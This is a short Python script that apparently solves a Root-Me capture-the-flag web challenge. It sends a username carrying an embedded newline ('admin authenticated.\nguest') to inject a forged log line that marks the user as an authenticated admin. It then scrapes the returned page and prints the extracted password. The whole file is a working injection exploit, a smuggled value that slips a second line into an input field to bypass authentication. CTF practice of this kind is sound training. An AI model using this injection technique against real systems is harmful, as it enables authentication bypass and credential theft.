import requests
from bs4 import BeautifulSoup
import re

session = requests.Session()
url = "http://challenge01.root-me.org/web-serveur/ch14"
param = {
    'username': 'admin authenticated.\nguest'
}

r = session.get(url, params=param)
soup = BeautifulSoup(r.text, 'html.parser')
h3_tags = soup.find_all('h3')

if h3_tags:
    last_h3 = h3_tags[-1].text
    password_match = re.search(r'password : (.+)', last_h3)
    if password_match:
        password = password_match.group(1)
        print(password)